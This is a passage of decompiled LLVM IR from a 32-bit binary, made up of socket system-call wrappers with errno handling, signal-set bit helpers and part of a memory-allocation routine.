  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13618 = load i32, i32* @r4, align 4
  store i32 %v3_13618, i32* %stack_var_-8, align 4
  %v5_1361c = inttoptr i32 %arg3 to i32*
  %v6_1361c = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_1361c)
  store i32 %v6_1361c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_1361c, -4095
  br i1 %tmp, label %dec_label_pc_1363c, label %dec_label_pc_1362c

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13618
  %v0_1362c = call i32 @function_13470()
  %v0_13630 = load i32, i32* %r4.global-to-local, align 4
  %v1_13630 = sub i32 0, %v0_13630
  %v2_13634 = inttoptr i32 %v0_1362c to i32*
  store i32 %v1_13630, i32* %v2_13634, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %dec_label_pc_13618, %dec_label_pc_1362c
  %v0_1363c = phi i32 [ %v6_1361c, %dec_label_pc_13618 ], [ -1, %dec_label_pc_1362c ]
  %v2_13640 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13640, i32* @r4, align 4
  ret i32 %v0_1363c

; uselistorder directives
  uselistorder i32 %v6_1361c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1363c, { 1, 0 }
}

define i32 @function_13644(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13644:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13644 = load i32, i32* @r4, align 4
  store i32 %v3_13644, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_1364c = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  store i32 %v5_1364c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1364c, -4095
  br i1 %tmp, label %dec_label_pc_1366c, label %dec_label_pc_1365c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_13644
  %v0_1365c = call i32 @function_13470()
  %v0_13660 = load i32, i32* %r4.global-to-local, align 4
  %v1_13660 = sub i32 0, %v0_13660
  %v2_13664 = inttoptr i32 %v0_1365c to i32*
  store i32 %v1_13660, i32* %v2_13664, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13644, %dec_label_pc_1365c
  %v0_1366c = phi i32 [ %v5_1364c, %dec_label_pc_13644 ], [ -1, %dec_label_pc_1365c ]
  %v2_13670 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13670, i32* @r4, align 4
  ret i32 %v0_1366c

; uselistorder directives
  uselistorder i32 %v5_1364c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1366c, { 1, 0 }
}

define i32 @function_13674(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13674:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13674 = load i32, i32* @r4, align 4
  store i32 %v3_13674, i32* %stack_var_-8, align 4
  %v2_13678 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_13678, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13678, -4095
  br i1 %tmp, label %dec_label_pc_13698, label %dec_label_pc_13688

dec_label_pc_13688:                               ; preds = %dec_label_pc_13674
  %v0_13688 = call i32 @function_13470()
  %v0_1368c = load i32, i32* %r4.global-to-local, align 4
  %v1_1368c = sub i32 0, %v0_1368c
  %v2_13690 = inttoptr i32 %v0_13688 to i32*
  store i32 %v1_1368c, i32* %v2_13690, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13698

dec_label_pc_13698:                               ; preds = %dec_label_pc_13674, %dec_label_pc_13688
  %v0_13698 = phi i32 [ %v2_13678, %dec_label_pc_13674 ], [ -1, %dec_label_pc_13688 ]
  %v2_1369c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1369c, i32* @r4, align 4
  ret i32 %v0_13698

; uselistorder directives
  uselistorder i32 %v2_13678, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13698, { 1, 0 }
}

define i32 @function_136a0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_136a0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136a0 = load i32, i32* @r4, align 4
  store i32 %v3_136a0, i32* %stack_var_-8, align 4
  %v5_136a4 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_136a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_136a4, -4095
  br i1 %tmp, label %dec_label_pc_136c4, label %dec_label_pc_136b4

dec_label_pc_136b4:                               ; preds = %dec_label_pc_136a0
  %v0_136b4 = call i32 @function_13470()
  %v0_136b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_136b8 = sub i32 0, %v0_136b8
  %v2_136bc = inttoptr i32 %v0_136b4 to i32*
  store i32 %v1_136b8, i32* %v2_136bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136c4

dec_label_pc_136c4:                               ; preds = %dec_label_pc_136a0, %dec_label_pc_136b4
  %v0_136c4 = phi i32 [ %v5_136a4, %dec_label_pc_136a0 ], [ -1, %dec_label_pc_136b4 ]
  %v2_136c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136c8, i32* @r4, align 4
  ret i32 %v0_136c4

; uselistorder directives
  uselistorder i32 %v5_136a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136c4, { 1, 0 }
}

define i32 @function_136cc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_136cc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_136cc = load i32, i32* @r4, align 4
  store i32 %v3_136cc, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_136d8 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  store i32 %v5_136d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_136d8, -4095
  br i1 %tmp, label %dec_label_pc_136f8, label %dec_label_pc_136e8

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136cc
  %v0_136e8 = call i32 @function_13470()
  %v0_136ec = load i32, i32* %r4.global-to-local, align 4
  %v1_136ec = sub i32 0, %v0_136ec
  %v2_136f0 = inttoptr i32 %v0_136e8 to i32*
  store i32 %v1_136ec, i32* %v2_136f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_136f8

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136cc, %dec_label_pc_136e8
  %v0_136f8 = phi i32 [ %v5_136d8, %dec_label_pc_136cc ], [ -1, %dec_label_pc_136e8 ]
  %v2_136fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_136fc, i32* @r4, align 4
  ret i32 %v0_136f8

; uselistorder directives
  uselistorder i32 %v5_136d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136f8, { 1, 0 }
}

define i32 @function_13700(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13700:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13700 = load i32, i32* @r4, align 4
  store i32 %v3_13700, i32* %stack_var_-8, align 4
  %v5_13704 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_13704, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13704, -4095
  br i1 %tmp, label %dec_label_pc_13724, label %dec_label_pc_13714

dec_label_pc_13714:                               ; preds = %dec_label_pc_13700
  %v0_13714 = call i32 @function_13470()
  %v0_13718 = load i32, i32* %r4.global-to-local, align 4
  %v1_13718 = sub i32 0, %v0_13718
  %v2_1371c = inttoptr i32 %v0_13714 to i32*
  store i32 %v1_13718, i32* %v2_1371c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13724

dec_label_pc_13724:                               ; preds = %dec_label_pc_13700, %dec_label_pc_13714
  %v0_13724 = phi i32 [ %v5_13704, %dec_label_pc_13700 ], [ -1, %dec_label_pc_13714 ]
  %v2_13728 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13728, i32* @r4, align 4
  ret i32 %v0_13724

; uselistorder directives
  uselistorder i32 %v5_13704, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13724, { 1, 0 }
}

define i32 @function_1372c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1372c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13738 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_13738, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13738, -4095
  br i1 %tmp, label %dec_label_pc_13758, label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %dec_label_pc_1372c
  %v0_13748 = call i32 @function_13470()
  %v0_1374c = load i32, i32* %r4.global-to-local, align 4
  %v1_1374c = sub i32 0, %v0_1374c
  %v2_13750 = inttoptr i32 %v0_13748 to i32*
  store i32 %v1_1374c, i32* %v2_13750, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_1372c, %dec_label_pc_13748
  %v0_13758 = phi i32 [ %v5_13738, %dec_label_pc_1372c ], [ -1, %dec_label_pc_13748 ]
  ret i32 %v0_13758

; uselistorder directives
  uselistorder i32 %v5_13738, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13758, { 1, 0 }
}

define i32 @function_13760(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13760:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13760 = load i32, i32* @r4, align 4
  store i32 %v3_13760, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13768 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_13768, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13768, -4095
  br i1 %tmp, label %dec_label_pc_13788, label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13760
  %v0_13778 = call i32 @function_13470()
  %v0_1377c = load i32, i32* %r4.global-to-local, align 4
  %v1_1377c = sub i32 0, %v0_1377c
  %v2_13780 = inttoptr i32 %v0_13778 to i32*
  store i32 %v1_1377c, i32* %v2_13780, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13788

dec_label_pc_13788:                               ; preds = %dec_label_pc_13760, %dec_label_pc_13778
  %v0_13788 = phi i32 [ %v5_13768, %dec_label_pc_13760 ], [ -1, %dec_label_pc_13778 ]
  %v2_1378c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1378c, i32* @r4, align 4
  ret i32 %v0_13788

; uselistorder directives
  uselistorder i32 %v5_13768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13788, { 1, 0 }
}

define i32 @function_13790(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13790:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13790 = load i32, i32* @r4, align 4
  store i32 %v3_13790, i32* %stack_var_-8, align 4
  %v3_13794 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_13794, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_13794, -4095
  br i1 %tmp, label %dec_label_pc_137b4, label %dec_label_pc_137a4

dec_label_pc_137a4:                               ; preds = %dec_label_pc_13790
  %v0_137a4 = call i32 @function_13470()
  %v0_137a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_137a8 = sub i32 0, %v0_137a8
  %v2_137ac = inttoptr i32 %v0_137a4 to i32*
  store i32 %v1_137a8, i32* %v2_137ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_137b4

dec_label_pc_137b4:                               ; preds = %dec_label_pc_13790, %dec_label_pc_137a4
  %v0_137b4 = phi i32 [ %v3_13794, %dec_label_pc_13790 ], [ -1, %dec_label_pc_137a4 ]
  %v2_137b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_137b8, i32* @r4, align 4
  ret i32 %v0_137b4

; uselistorder directives
  uselistorder i32 %v3_13794, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137b4, { 1, 0 }
}

define i32 @function_137bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_137bc:
  %v3_137bc = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_137c4 = call i32 @function_12ef4()
  %v0_137c8 = load i32, i32* @r4, align 4
  store i32 %v3_137bc, i32* @r4, align 4
  %v2_137d0 = call i32 @function_12f9c(i32 %v0_137c4, i32 %v0_137c8)
  ret i32 %v2_137d0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_12f9c, { 14, 16, 13, 12, 11, 10, 9, 15, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_12ef4, { 0, 1, 3, 2 }
}

define i32 @function_137d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_137d4:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_137f0, label %dec_label_pc_137e0

dec_label_pc_137e0:                               ; preds = %dec_label_pc_137d4
  %v8_137e4 = icmp sgt i32 %arg1, 64
  br i1 %v8_137e4, label %dec_label_pc_137f0, label %dec_label_pc_137e8

dec_label_pc_137e8:                               ; preds = %dec_label_pc_137e0
  %v0_137ec = call i32 @function_138f8()
  br label %dec_label_pc_137f0

dec_label_pc_137f0:                               ; preds = %dec_label_pc_137e0, %dec_label_pc_137d4, %dec_label_pc_137e8
  %v0_137f0 = call i32 @function_13470()
  %v2_137f8 = inttoptr i32 %v0_137f0 to i32*
  store i32 22, i32* %v2_137f8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_137f0, { 2, 0, 1 }
}

define i32 @function_13804(i32 %arg1) local_unnamed_addr {
dec_label_pc_13804:
  store i32 128, i32* @r2, align 4
  %v0_13810 = load i32, i32* @r0, align 4
  %v2_13810 = inttoptr i32 %v0_13810 to i8*
  %v3_13810 = call i32 @function_134d0(i8* %v2_13810, i32 0)
  ret i32 0
}

define i32 @function_1381c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1381c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1381c = load i32, i32* @r4, align 4
  store i32 %v3_1381c, i32* %stack_var_-12, align 4
  %v6_1381c = load i32, i32* @r5, align 4
  %v10_1381c = ptrtoint i32* %stack_var_-12 to i32
  %v7_13820 = icmp eq i32 %arg2, -1
  %v0_1382c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_13820, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1381c
  br label %dec_label_pc_13844

bb:                                               ; preds = %dec_label_pc_1381c
  %v2_13828 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_1382c.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_1382c.pre, 1
  br i1 %tmp19, label %dec_label_pc_13844, label %dec_label_pc_13834

dec_label_pc_13834:                               ; preds = %bb
  %v7_13838 = icmp sgt i32 %v0_1382c.pre, 64
  br i1 %v7_13838, label %dec_label_pc_13844, label %bb20

bb20:                                             ; preds = %dec_label_pc_13834
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1386824 = add i32 %v10_1381c, 124
  br label %dec_label_pc_13858

dec_label_pc_13844:                               ; preds = %.thread, %dec_label_pc_13834, %bb
  %v0_13844 = call i32 @function_13470()
  store i32 %v0_13844, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r2, align 4
  %v2_13850 = inttoptr i32 %v0_13844 to i32*
  store i32 22, i32* %v2_13850, align 4
  %v0_138c4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_138c4

dec_label_pc_13858:                               ; preds = %bb20, %dec_label_pc_13858
  %v5_1386825 = phi i32 [ %v5_1386824, %bb20 ], [ %v5_13868, %dec_label_pc_13858 ]
  %v2_1385c = add i32 %v5_1386825, -136
  %v3_1385c = inttoptr i32 %v2_1385c to i32*
  store i32 0, i32* %v3_1385c, align 4
  %v0_13860.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13860 = add i32 %v0_13860.pre, -1
  store i32 %v1_13860, i32* %r0.global-to-local, align 4
  %v6_13860 = icmp slt i32 %v1_13860, 0
  %v4_13868 = mul i32 %v1_13860, 4
  %v5_13868 = add i32 %v4_13868, %v10_1381c
  br i1 %v6_13860, label %dec_label_pc_13870, label %dec_label_pc_13858

dec_label_pc_13870:                               ; preds = %dec_label_pc_13858
  %v2_13870 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_13870, i32* @r5, align 4
  %v2_13874 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_13874, i32* @r0, align 4
  %v0_13878 = load i32, i32* @r4, align 4
  store i32 %v0_13878, i32* @r1, align 4
  %v0_1387c = call i32 @function_138f8()
  store i32 %v0_1387c, i32* %r0.global-to-local, align 4
  %v1_13880 = icmp slt i32 %v0_1387c, 0
  br i1 %v1_13880, label %dec_label_pc_138c0, label %dec_label_pc_13888

dec_label_pc_13888:                               ; preds = %dec_label_pc_13870
  %v0_13888 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ea38.588 to i32), i32* %r0.global-to-local, align 4
  %v2_13890 = call i32 @function_138d4(i32 ptrtoint (i32* @global_var_1ea38.588 to i32), i32 %v0_13888)
  %v0_138a8 = load i32, i32* @r4, align 4
  store i32 %v0_138a8, i32* %r0.global-to-local, align 4
  %v4_138b0 = call i32 @function_147c0(i32 %v0_138a8, i32* nonnull %stack_var_-152, i32 %v2_13828)
  store i32 %v4_138b0, i32* %r0.global-to-local, align 4
  %v1_138b4 = icmp slt i32 %v4_138b0, 0
  br i1 %v1_138b4, label %dec_label_pc_138c0, label %bb23

bb23:                                             ; preds = %dec_label_pc_13888
  %v5_138b8 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_138b8, i32* @r2, align 4
  br label %dec_label_pc_138c4

dec_label_pc_138c0:                               ; preds = %dec_label_pc_13888, %dec_label_pc_13870
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_138c4

dec_label_pc_138c4:                               ; preds = %bb23, %dec_label_pc_13844, %dec_label_pc_138c0
  %v0_138c4 = phi i32 [ %v5_138b8, %bb23 ], [ %v0_138c4.pre, %dec_label_pc_13844 ], [ -1, %dec_label_pc_138c0 ]
  store i32 %v0_138c4, i32* %r0.global-to-local, align 4
  %v2_138cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_138cc, i32* @r4, align 4
  store i32 %v6_1381c, i32* @r5, align 4
  ret i32 %v0_138c4

; uselistorder directives
  uselistorder i32 %v0_138c4, { 1, 0 }
  uselistorder i32 %v1_13860, { 0, 2, 1 }
  uselistorder i32 %v0_1382c.pre, { 1, 0, 2 }
  uselistorder i32 %v10_1381c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_138c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13858, { 1, 0 }
  uselistorder label %dec_label_pc_13844, { 1, 2, 0 }
}

define i32 @function_138d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_138d4:
  %v1_138d4 = add i32 %arg2, -1
  %v3_138d8 = udiv i32 %v1_138d4, 32
  %v4_138dc = mul nuw nsw i32 %v3_138d8, 4
  %v5_138dc = add i32 %v4_138dc, %arg1
  %v6_138dc = inttoptr i32 %v5_138dc to i32*
  %v7_138dc = load i32, i32* %v6_138dc, align 4
  %v1_138e0 = urem i32 %v1_138d4, 32
  %v7_138e8 = shl i32 1, %v1_138e0
  %v8_138e8 = and i32 %v7_138dc, %v7_138e8
  %v10_138e8 = icmp ne i32 %v8_138e8, 0
  %. = zext i1 %v10_138e8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_138d4, { 1, 0 }
}

define i32 @function_138f8() local_unnamed_addr {
dec_label_pc_138f8:
  %v0_138f8 = load i32, i32* @r1, align 4
  %v1_138f8 = add i32 %v0_138f8, -1
  %v3_138fc = udiv i32 %v1_138f8, 32
  store i32 %v3_138fc, i32* @ip, align 4
  %v0_13900 = load i32, i32* @r0, align 4
  %v4_13900 = mul nuw nsw i32 %v3_138fc, 4
  %v5_13900 = add i32 %v0_13900, %v4_13900
  %v6_13900 = inttoptr i32 %v5_13900 to i32*
  %v7_13900 = load i32, i32* %v6_13900, align 4
  %v1_13904 = urem i32 %v1_138f8, 32
  %v7_1390c = shl i32 1, %v1_13904
  %v8_1390c = or i32 %v7_13900, %v7_1390c
  store i32 %v8_1390c, i32* %v6_13900, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_138fc, { 1, 0 }
  uselistorder i32 %v1_138f8, { 1, 0 }
}

define i32 @function_1391c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1391c:
  %v1_1391c = add i32 %arg2, -1
  %v3_13920 = udiv i32 %v1_1391c, 32
  %v4_13924 = mul nuw nsw i32 %v3_13920, 4
  %v5_13924 = add i32 %v4_13924, %arg1
  %v6_13924 = inttoptr i32 %v5_13924 to i32*
  %v7_13924 = load i32, i32* %v6_13924, align 4
  %v1_13928 = urem i32 %v1_1391c, 32
  %tmp = shl i32 -1, %v1_13928
  %v8_13930 = add i32 %tmp, -1
  %v9_13930 = and i32 %v7_13924, %v8_13930
  store i32 %v9_13930, i32* %v6_13924, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1391c, { 1, 0 }
}

define i32 @function_13940(i32 %arg1) local_unnamed_addr {
dec_label_pc_13940:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13940 = load i32, i32* @r4, align 4
  %v6_13940 = load i32, i32* @r5, align 4
  %v9_13940 = load i32, i32* @r6, align 4
  %v0_13944 = load i32, i32* %r0.global-to-local, align 4
  %v2_13944 = icmp eq i32 %v0_13944, 0
  %v2_13948 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_13944, label %bb, label %dec_label_pc_13954

bb:                                               ; preds = %dec_label_pc_13940
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1395c

dec_label_pc_13954:                               ; preds = %dec_label_pc_13940
  %tmp = icmp ugt i32 %v0_13944, -8
  br i1 %tmp, label %dec_label_pc_13a60, label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %bb, %dec_label_pc_13954
  %v0_1395c = phi i32 [ %v0_13944, %dec_label_pc_13954 ], [ 1, %bb ]
  %v1_1395c = add i32 %v0_1395c, 4
  store i32 %v1_1395c, i32* %stack_var_-20, align 4
  store i32 %v2_13948, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e428.590 to i32), i32* %r0.global-to-local, align 4
  %v1_13974 = call i32 @function_144d4()
  store i32 ptrtoint (i32** @global_var_1e250.594 to i32), i32* %r0.global-to-local, align 4
  %v3_13980 = call i32 @function_13cf4(i32* bitcast (i32** @global_var_1e250.594 to i32*), i32 %v2_13948)
  store i32 %v3_13980, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e428.590 to i32), i32* %r0.global-to-local, align 4
  store i32 80280, i32* @lr, align 4
  %v1_13994 = call i32 @function_144d4()
  store i32 %v1_13994, i32* %r0.global-to-local, align 4
  %v2_13998 = icmp eq i32 %v3_13980, 0
  br i1 %v2_13998, label %dec_label_pc_139a0, label %dec_label_pc_13a50

dec_label_pc_139a0:                               ; preds = %dec_label_pc_1395c
  %v2_139a4 = load i32, i32* @global_var_1e450.597, align 4
  store i32 %v2_139a4, i32* @r4, align 4
  %v2_139a8 = load i32, i32* %stack_var_-20, align 4
  %v3_139ac = icmp ult i32 %v2_139a8, %v2_139a4
  br i1 %v3_139ac, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_139a0
  %v3_139b0 = add i32 %v2_139a4, -1
  %v2_139b4 = add i32 %v3_139b0, %v2_139a8
  %v2_139b8 = sub i32 0, %v2_139a4
  %v3_139bc = and i32 %v2_139b4, %v2_139b8
  store i32 %v3_139bc, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_139a0, %bb14
  store i32 ptrtoint (i32* @global_var_1eab8.599 to i32), i32* %r0.global-to-local, align 4
  %v1_139c8 = call i32 @function_144d4()
  %v0_139cc = load i32, i32* @r4, align 4
  store i32 %v0_139cc, i32* %r0.global-to-local, align 4
  %v1_139d0 = call i32 @function_14c88(i32 %v0_139cc)
  store i32 %v1_139d0, i32* %r0.global-to-local, align 4
  %v7_139d4 = icmp eq i32 %v1_139d0, -1
  br i1 %v7_139d4, label %bb15, label %dec_label_pc_139e0

bb15:                                             ; preds = %.thread3
  store i32 %v1_139d0, i32* @r5, align 4
  br label %dec_label_pc_139f4

dec_label_pc_139e0:                               ; preds = %.thread3
  %v1_139e0 = add i32 %v1_139d0, 3
  %v1_139e4 = and i32 %v1_139e0, -4
  store i32 %v1_139e4, i32* @r5, align 4
  %v9_139e8 = icmp eq i32 %v1_139e4, %v1_139d0
  br i1 %v9_139e8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_139e0
  %v3_139ec = sub i32 %v1_139e4, %v1_139d0
  store i32 %v3_139ec, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_139e0, %bb16
  %v1_139f0 = xor i1 %v9_139e8, true
  call void @__pseudo_cond_branch(i1 %v1_139f0, i32 ptrtoint (i32* @global_var_14c88.600 to i32))
  br label %dec_label_pc_139f4

dec_label_pc_139f4:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1eab8.599 to i32), i32* %r0.global-to-local, align 4
  store i32 80388, i32* @lr, align 4
  %v1_13a00 = call i32 @function_144d4()
  store i32 %v1_13a00, i32* %r0.global-to-local, align 4
  %v0_13a04 = load i32, i32* @r5, align 4
  %v7_13a04 = icmp eq i32 %v0_13a04, -1
  br i1 %v7_13a04, label %dec_label_pc_13a60, label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_139f4
  store i32 ptrtoint (i32* @global_var_1e428.590 to i32), i32* %r0.global-to-local, align 4
  %v1_13a18 = call i32 @function_144d4()
  %v0_13a1c = load i32, i32* @r4, align 4
  %v0_13a20 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1e250.594 to i32), i32* %r0.global-to-local, align 4
  %v4_13a28 = call i32 @function_13e48(i32* bitcast (i32** @global_var_1e250.594 to i32*), i32 %v0_13a20, i32 %v0_13a1c)
  store i32 ptrtoint (i32** @global_var_1e250.594 to i32), i32* %r0.global-to-local, align 4
  %v3_13a34 = call i32 @function_13cf4(i32* bitcast (i32** @global_var_1e250.594 to i32*), i32 %v2_13948)
  store i32 %v3_13a34, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e428.590 to i32), i32* %r0.global-to-local, align 4
  store i32 80456, i32* @lr, align 4
  %v1_13a44 = call i32 @function_144d4()
  store i32 %v1_13a44, i32* %r0.global-to-local, align 4
  %v2_13a48 = icmp eq i32 %v3_13a34, 0
  br i1 %v2_13a48, label %dec_label_pc_13a60, label %dec_label_pc_13a50

dec_label_pc_13a50:                               ; preds = %dec_label_pc_1395c, %dec_label_pc_13a0c
  %v1_13a54 = phi i32 [ %v3_13980, %dec_label_pc_1395c ], [ %v3_13a34, %dec_label_pc_13a0c ]
  %v2_13a50 = load i32, i32* %stack_var_-20, align 4
  %v2_13a54 = inttoptr i32 %v1_13a54 to i32*
  store i32 %v2_13a50, i32* %v2_13a54, align 4
  %v3_13a54 = load i32, i32* %r4.global-to-local, align 4
  %v4_13a54 = add i32 %v3_13a54, 4
  store i32 %v4_13a54, i32* %r4.global-to-local, align 4
  %v2_13a58 = icmp eq i32 %v4_13a54, 0
  br i1 %v2_13a58, label %dec_label_pc_13a60, label %dec_label_pc_13a70

